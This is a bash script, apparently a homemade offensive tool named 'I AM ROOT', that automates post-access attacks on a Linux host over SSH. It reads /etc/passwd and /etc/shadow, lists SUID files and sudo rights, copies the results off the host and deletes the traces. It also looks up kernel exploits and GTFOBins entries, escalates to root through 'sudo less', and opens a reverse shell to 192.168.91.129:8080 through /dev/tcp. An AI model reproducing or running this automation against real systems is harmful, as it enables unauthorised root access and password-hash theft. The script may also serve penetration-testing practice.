#!/bin/bash

# ------------------------------------------------------
# Colors
# Usage: (echo -e or echo -e) "${COLOR}TEXT HERE${NOCOLOR}"
# ------------------------------------------------------
NOCOLOR='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHTGRAY='\033[0;37m'
DARKGRAY='\033[1;30m'
LIGHTRED='\033[1;31m'
LIGHTGREEN='\033[1;32m'
YELLOW='\033[1;33m'
LIGHTBLUE='\033[1;34m'
LIGHTPURPLE='\033[1;35m'
LIGHTCYAN='\033[1;36m'
WHITE='\033[1;37m'
#-------------------------------------------------------

###################################################################################################################
#Ensure the script is being ran as root or with sudo privileges
if [ "$(id -u)" -ne 0 ]; then
      echo -e "${RED}
████████╗██╗░░██╗██╗░██████╗  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗
╚══██╔══╝██║░░██║██║██╔════╝  ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝
░░░██║░░░███████║██║╚█████╗░  ╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░
░░░██║░░░██╔══██║██║░╚═══██╗  ░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░
░░░██║░░░██║░░██║██║██████╔╝  ██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░
░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═════╝░  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░

      ███╗░░░███╗██╗░░░██╗░██████╗████████╗  ██████╗░███████╗
      ████╗░████║██║░░░██║██╔════╝╚══██╔══╝  ██╔══██╗██╔════╝
      ██╔████╔██║██║░░░██║╚█████╗░░░░██║░░░  ██████╦╝█████╗░░
      ██║╚██╔╝██║██║░░░██║░╚═══██╗░░░██║░░░  ██╔══██╗██╔══╝░░
      ██║░╚═╝░██║╚██████╔╝██████╔╝░░░██║░░░  ██████╦╝███████╗
      ╚═╝░░░░░╚═╝░╚═════╝░╚═════╝░░░░╚═╝░░░  ╚═════╝░╚══════╝

██████╗░░█████╗░███╗░░██╗  ░█████╗░░██████╗  ██████╗░░█████╗░░█████╗░████████╗
██╔══██╗██╔══██╗████╗░██║  ██╔══██╗██╔════╝  ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
██████╔╝███████║██╔██╗██║  ███████║╚█████╗░  ██████╔╝██║░░██║██║░░██║░░░██║░░░
██╔══██╗██╔══██║██║╚████║  ██╔══██║░╚═══██╗  ██╔══██╗██║░░██║██║░░██║░░░██║░░░
██║░░██║██║░░██║██║░╚███║  ██║░░██║██████╔╝  ██║░░██║╚█████╔╝╚█████╔╝░░░██║░░░
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝  ╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝░╚════╝░░╚════╝░░░░╚═╝░░░${NOCOLOR}"
      exit 1
fi
clear
sleep 1
###################################################################################################################

function start() {

      MSG1="STARTING PROGRAM....................................[✔]"
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG1"  
      sleep 2
      echo
      echo
 ###################################################################################################################
      #To create a directory for the script.
      #This command needs to stay in this location

      HOME1=$(pwd)
      # We check that a working directory exists, if not we create one

      [ ! -d "$HOME1/I_AM_ROOT/" ] && mkdir $HOME1/I_AM_ROOT/ && MSG2="CREATING DIRECTORY..................................[✔]" || MSG3="DIRECTORY ALREADY EXISTS............................[✔]"
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG2"
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG3"

      sleep 2
      echo
      echo
 ###################################################################################################################
 #MSG=""
 #while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG"
 # ✖
 # ✔
 ###################################################################################################################
      #Checking for dependencies

      MSG4="CHECKING FOR REQUIRED DEPENDENCIES..................[✔]"
      MSG5="NON-EXISTENT DEPENDECIES WILL BE INSTALLED..........[✔]"

      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG4"
      echo
      echo
      sleep 2
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG5"

      sshpass -v >/dev/null
            if [ $? -gt 0 ]; then
            sudo apt install sshpass -y
      fi

      expect -v >/dev/null
            if [ $? -gt 0 ]; then
            sudo apt install expect -y
      fi

      xterm -v >/dev/null 
            if [ $? -gt 0 ]; then
            sudo apt-get install xterm -y
      fi

      searchsploit -u
            if [ $? -ne 6 ]; then
            sudo apt install exploitdb -y
      fi
}
#Calling function
start

sleep 1
clear
sleep 2
###################################################################################################################
#Banners
function banners(){

 echo -e "${GREEN}                                   wr^^        ^-q__                           ${NOCOLOR}"
 sleep .1                             
 echo -e "${GREEN}                               _dP                 9m_                         ${NOCOLOR}"
 sleep .1
 echo -e "${GREEN}                             _#P                     9#_                       ${NOCOLOR}"
 sleep .1            
 echo -e "${GREEN}                           d#@                       9#m                       ${NOCOLOR}"
 sleep .1 
 echo -e "${GREEN}                          d##                         ###                      ${NOCOLOR}"
 sleep .1 
 echo -e "${GREEN}                        J###                           ###L                    ${NOCOLOR}" 
 sleep .1 
 echo -e "${GREEN}                        {###K                         J###K                    ${NOCOLOR}"
 sleep .1  
 echo -e "${GREEN}                        ]####K        ___aaa___      J####F                    ${NOCOLOR}" 
 sleep .1 
 echo -e "${GREEN}                      __gmM######_  w#P^^   ^^9#m  _d#####Mmw__                ${NOCOLOR}"
 sleep .1  
 echo -e "${GREEN}                   _g##############mZ_         __g##############m_             ${NOCOLOR}"
 sleep .1
 echo -e "${GREEN}                 _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_           ${NOCOLOR}"  
 sleep .1
 echo -e "${GREEN}                a###^^          ,Z######@^ ^######^\g          ^^M##m          ${NOCOLOR}"
 sleep .1
 echo -e "${GREEN}               J#@^             0L  ^*##     ##@^  J#              *#K         ${NOCOLOR}"
 sleep .1
 echo -e "${GREEN}               #^               ##    ~_gmwgm_~    dF               ##_        ${NOCOLOR}"  
 sleep .1
 echo -e "${GREEN}              7F                 ^#_   ]#####F   _dK                 JE        ${NOCOLOR}"  
 sleep .1
 echo -e "${GREEN}              1                    *m__ ##### __g@^                   F        ${NOCOLOR}"  
 sleep .1
 echo -e "${GREEN}                                     ^PJ#####LP^                               ${NOCOLOR}"  
 sleep .1
 echo -e "${GREEN}               ^                       0######_                      ^         ${NOCOLOR}"  
 sleep .1
 echo -e "${GREEN}                                     _0########_                               ${NOCOLOR}"    
 sleep .1
 echo -e "${GREEN}                   .               _d#####^#####m__              ^             ${NOCOLOR}"
 sleep .1
 echo -e "${GREEN}                    ^*w_________am#####P^   ~9#####mw_________w*^              ${NOCOLOR}"
 sleep .1
 echo -e "${GREEN}                        ^^9@#####@M^^           ^^P@#####@M^^                  ${NOCOLOR}"


    

 echo
 sleep 1
 printf '\e[0;31m%-6s\e[m' "$(tput bold)                                                                               
      @@@         @@@@@@   @@@@@@@@@@         @@@@@@@    @@@@@@    @@@@@@   @@@@@@@"
 sleep .1
 printf '\e[0;31m%-6s\e[m' "$(tput bold)  
      @@@        @@@@@@@@  @@@@@@@@@@@        @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@"
 sleep .1
 printf '\e[0;31m%-6s\e[m' "$(tput bold)        
      @@!        @@!  @@@  @@! @@! @@!        @@!  @@@  @@!  @@@  @@!  @@@    @@!"
 sleep .1
 printf '\e[0;31m%-6s\e[m' "$(tput bold)    
      !@!        !@!  @!@  !@! !@! !@!        !@!  @!@  !@!  @!@  !@!  @!@    !@!"
 sleep .1
 printf '\e[0;31m%-6s\e[m' "$(tput bold)    
      !!@        @!@!@!@!  @!! !!@ @!@        @!@!!@!   @!@  !@!  @!@  !@!    @!!"
 sleep .1
 printf '\e[0;31m%-6s\e[m' "$(tput bold)    
      !!!        !!!@!!!!  !@!   ! !@!        !!@!@!    !@!  !!!  !@!  !!!    !!!"
 sleep .1
 printf '\e[0;31m%-6s\e[m' "$(tput bold)   
      !!:        !!:  !!!  !!:     !!:        !!: :!!   !!:  !!!  !!:  !!!    !!:"
 sleep .1
 printf '\e[0;31m%-6s\e[m' "$(tput bold)    
      :!:        :!:  !:!  :!:     :!:        :!:  !:!  :!:  !:!  :!:  !:!    :!:"
 sleep .1
 printf '\e[0;31m%-6s\e[m' "$(tput bold)  
       ::        ::   :::  :::     ::         ::   :::  ::::: ::  ::::: ::     ::"
 sleep .1
 printf '\e[0;31m%-6s\e[m' "$(tput bold)
      :           :   : :   :      :           :   : :   : :  :    : :  :      :


"
 }
sleep .5
#Function banners
banners
###################################################################################################################
#Function to check IP address is in the proper format

function validateIP(){

      IP_ADDRESS="$1"
      #Check if the format looks right
      echo -e "$IP_ADDRESS" | grep -E -qE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' || return 1
      #Check that each octect is less than or equal to 255:
      echo -e "$IP_ADDRESS" | awk -F'.' '$1 <=255 && $2 <= 255 && $3 <=255 && $4 <= 255 {print "Y" } ' | grep -q Y || return 1
      return 0


      echo 
      sleep 2
 }
 #Call function
validateIP

 ###################################################################################################################
 #Ask for user input
 function ip_input(){
      
      MSG11="ENTER IP ADDRESS: " 
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG11"
      read -r IP_ADDRESS


      [ ! -d "$HOME1/I_AM_ROOT/$IP_ADDRESS" ] && mkdir $HOME1/I_AM_ROOT/$IP_ADDRESS
      DEST=$HOME1/I_AM_ROOT/$IP_ADDRESS/

      sleep 1
      
  ###################################################################################################################
      # While loop to validate the IP provided, if ip is not valid then it will ask for a valid ip
      while ! validateIP "$IP_ADDRESS"
            do
                  echo
                  MSG12="INVALID IP"
                  while read -rn1;do echo -ne "${RED}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG12"
                   sleep .1
                  echo
                  echo
                  MSG13="ENTER A VALID IP: " 
                  while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG13"
                  read -r IP_ADDRESS
            done
  }
#Call function
ip_input
echo

 ###################################################################################################################
 #Funcctions for username & password

function user (){ 

      MSG11="ENTER USERNAME: "
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG11"
      read -r USERNAME
      echo

 }
#Call function
user

function password(){ 

      MSG12="ENTER PASSWORD: "
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG12"
      read -s PASSWD
    
 }
#Call function
password
###################################################################################################################

sleep 2
echo
echo

###################################################################################################################
#Spin function for show (Need to implement into a process)


function progress(){
      SPINVAR1="PREPARING TO RUN PROGRAM"            
      spin(){
            while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$SPINVAR1" 
            spin1 &
            pid=$!


            for i in $(seq 1 7)
            do 
            sleep 1.5
            done

            kill $pid
            echo ""

        }

        spin1(){
            while [ 1 ]
            do
            echo -ne " ${GREEN}.${NOCOLOR}"
            sleep 1
            done  
        }
        spin
  }
progress
echo
clear
sleep 2
###################################################################################################################
# Variables

DIR=/home/$USERNAME/I_AM_ROOT/
F=Info.txt
SND="send \"echo '' >> $DIR${F}\r\""

###################################################################################################################
# Function with expect commands to ssh into remote host and execute commands. 
# It will attemp to gather info for possible privilge escalation

MSG13="EXECUTING COMMANDS, NO FURTHER USER INPUT NECESSARY, PLEASE BE PATIENT.........." 
while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG13"
echo
echo

sleep 2

function get_info {
      expect -c "\
      set timeout 5 
      set env(TERM)
      spawn ssh -t "$USERNAME\@$IP_ADDRESS"
      send \"\r\"
      sleep 2 
      expect_before \"*(yes/no*\" {
      send \"yes\r\" 
      send \"$PASSWD\r\"
      }
      sleep 2
      expect \"*assword*\"
      send \"$PASSWD\r\"
      sleep 2
      send \"mkdir ${DIR}\r\"
      sleep 2
      send \"touch $DIR${F}\r\"
      sleep 1
      send \"echo -e 'I AM ROOTR RESULTS FOR ${IP_ADDRESS}' >> $DIR${F}\r\"
      ${SND}
      ${SND}
      ${SND}
      sleep 2
      send \"echo '@############################## $USERNAME PATH ############################## ' >> $DIR${F}\r\"
      sleep 2
      ${SND}
      sleep 2
      send \"echo $PATH >> ${DIR}${F}\r\"
      sleep 2
      ${SND}
      send \"echo '@##############################  /ETC/PASSWD ############################## ' >> $DIR${F}\r\"
      ${SND}
      send \"cat /etc/passwd >> ${DIR}${F}\r\"
      sleep 2
      ${SND}
      send \"echo '@##############################  /ETC/SHADOW ############################## ' >> $DIR${F}\r\"
      ${SND}
      sleep 2
      send \"sudo cat /etc/shadow >> $DIR${F}\r\"
      sleep 2
      expect \"*assword*\"
      send \"$PASSWD\r\"
      sleep 1
      ${SND}
      ${SND}
      send \"echo '@##############################  SUID FILES ##############################' >> $DIR${F}\r\"
      ${SND}
      send \"find / -perm -u=s -type f >> $DIR${F}\r\"
      expect \"*assword*\"
      send \"$PASSWD\r\"
      ${SND}
      send \"echo '@##############################  SUDO COMMANDS ############################## ' >> $DIR${F}\r\"
      ${SND}
      sleep 2
      send \"sudo -l >> ${DIR}${F}\r\"
      sleep 1
      expect \"*assword*\"
      send \"$PASSWD\r\"
      sleep 2
      ${SND}
      send \"echo '@##############################  KERNEL VERSION ############################## ' >> $DIR${F}\r\"
      ${SND}
      send \"uname -r >> ${DIR}${F}\r\"
      ${SND}
      sleep 2
      send \"exit\r\"
      "
  }
#Call function  
get_info

###################################################################################################################
echo
echo
clear
sleep 2

MSG14="COMMAND EXECUTION COMPLETE......." 
while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG14"
echo
echo

###################################################################################################################
# Commands to transfer the information and delete DIR in remote host.

MSG15="RETRIEVING INFORMATION......."
while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG15"
echo
echo

sleep 5
sshpass -p "$PASSWD" scp "$USERNAME"@"$IP_ADDRESS":"$DIR"${F} "$DEST"
sleep 5
current_time=$(date "+%Y.%m.%d-%H.%M.%S")
mv "$DEST"$F "$DEST""$IP_ADDRESS"-"$(date "+%Y.%m.%d-%H.%M.%S")"_.txt
Info="$DEST""$IP_ADDRESS"-"$(date "+%Y.%m.%d-%H.%M.%S")"_.txt

sshpass -p "$PASSWD" ssh "$USERNAME"@"$IP_ADDRESS" rm -r "$DIR"
sleep 3

###################################################################################################################
### Test phase for parsing information to the terminal### (Fisrt test succesful)

# Check for contents in the /ETC/SHADOW section of the file

clear

MSG16="/etc/shadow/..........Found"
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG16"
      sleep 1
      echo
      echo

grep '/ETC/SHADOW' -A2 "$Info" | grep 'root'
#positive result
if [ $? -eq 0 ]; then
      printf "


      THIS IS YOUR LUCKY DAY!!!
      THE GOD'S OF ENUMERATION HAVE DEEMED FIT 
      TO BESTOW THE KEY OF ROOT UPON YOU!!!

      BY USING THE UNSHADOW FEATURE OF JOHN THE RIPPER 
         ON THE /ETC/PASSWD AND /ETC/SHADOW FILES 
            YOU NOW PWN THE TARGET MACHINE


"
# negative result
else
      printf "

      ENUMERATION DID NOT GRANT YOU A /ETC/SHADOW FILE

"
fi

echo -e "${PURPLE}###########################################################################${NOCOLOR}"
echo
echo

sleep 7 
###################################################################################################################

MSG17="The user $USERNAME can execute 'less' command as sudo"
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG17"
      sleep 1
      echo

# Privilege escalation via sudo less

SUDOBLE=$(grep 'may run the following commands' -A3 "$Info" | sed -n '1!p')

printf '\n\n\n'
echo "Privilege escalation description:
        -sudo less into one of the listed files
        -go to end of file
        -type '!/bin/sh'
        -congratulations you are now root user."
echo
echo "While ssh'd as User '$USERNAME', The following files will permit privilege escalation:"
echo "  "$SUDOBLE

sleep 7 
echo
echo -e "${PURPLE}###########################################################################${NOCOLOR} 

"

###################################################################################################################

# Kernel Version in searchsploit
## Note: This may require checking for searchsploit in the beggining ###

MSG18="Checking Kernel Version.........."$KVSE
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG18"
      sleep 1
      echo
      echo

KVSE=$(grep 'KERNEL VERSION' -A2 "$Info" | sed -n '1,2!p')
KVSE=${KVSE:0:4}

echo "
        THE SEARCHSPLOIT DATABASE HAS THE FOLOWING 
        VULNERABILITIES LISTED FOR THE KERNEL VER.
        OF THE TARGET MACHINE:

    "
searchsploit "LINUX KERNEL " $KVSE

sleep 7
echo
echo -e "${PURPLE}###########################################################################${NOCOLOR} 

"

###################################################################################################################

# SUID Files exploit

MSG19="Checking SUID files.........."$KVSE
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG19"
      sleep 1
      echo
      echo

sed -n '/SUID/,/@/p' "$Info" | grep -oE '/[^/ ]+$' | grep -Po '^.{1}\K.*' > data.txt

while read line;

do lynx -dump https://gtfobins.github.io/gtfobins/"$line"/ > ro.txt;

wline=$(head -n 1 ro.txt)
wline=${wline:0:3}

REFI=result"-$(date "+%Y.%m.%d-%H.%M.%S")".txt
DERPI="$DEST""$REFI"
touch $DERPI

if [[ $wline -ne "404" ]]; then
   less ro.txt >> $DERPI
   echo ' ' >> $DERPI
   echo ' ' >> $DERPI
   echo '@##########@' >> $DERPI
   echo ' ' >> $DERPI
fi;

done < data.txt

rm ro.txt
rm data.txt

echo "
        DEAR USER, INFORMATION ON THE EXPLOITAITION OF
        ANY AVAILABLE SUID FILES CAN BE FOUND IN A
        SEPARATE TEXT FILE LOCATED AT:
    ./I_AM_ROOT/$IP_ADDRESS/$REFI
     "
###################################################################################################################
sleep 3


menu_option_one() {

    MSGA="ESTABLISHING CONNECTION FOR PRIVILE ESCALATION......."
      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSGA"
    echo
    echo
    sleep 2
    xterm -e 'nc -nlvp 8080' &
    sleep 2
    expect -c "\
    set timeout (5)
    set env(TERM)
    sleep 2
    spawn ssh -t $USERNAME@$IP_ADDRESS
    sleep 1
    expect \"*assword*\r\"
    send \"$PASSWD\r\"
    sleep 2
    send \"sudo less /etc/profile\r\"
    sleep 1
    expect \"*assword*\r\"
    send \"$PASSWD\r\"
    sleep 2
    send \"!/bin/sh\r\"
    sleep 1
    send \"bash -i >& /dev/tcp/192.168.91.129/8080 0>&1\r\"
    interact 

 "
}

menu_option_two() {
    echo "GOOD BYE"
}


press_enter() {
    echo ""
    echo -n " Press Enter to continue "
    read
    clear
}


incorrect_selection() {
    echo "Incorrect selection! Try again."
}


until [ "$selection" = "1" ] || [ "$selection" = "2" ]; do
    clear
    echo "Would to Attempt Privilege Escalation Using Sudo 'less' ?"
    echo ""
    echo "  1 - YES"
    echo "  2 - NO"
    echo ""
    echo -n "   Enter selection: "
    read selection
    echo ""
    case $selection in
        1 ) clear; menu_option_one;;
        2 ) clear; menu_option_two;;
        * ) clear; incorrect_selection ; press_enter ;;
    esac
done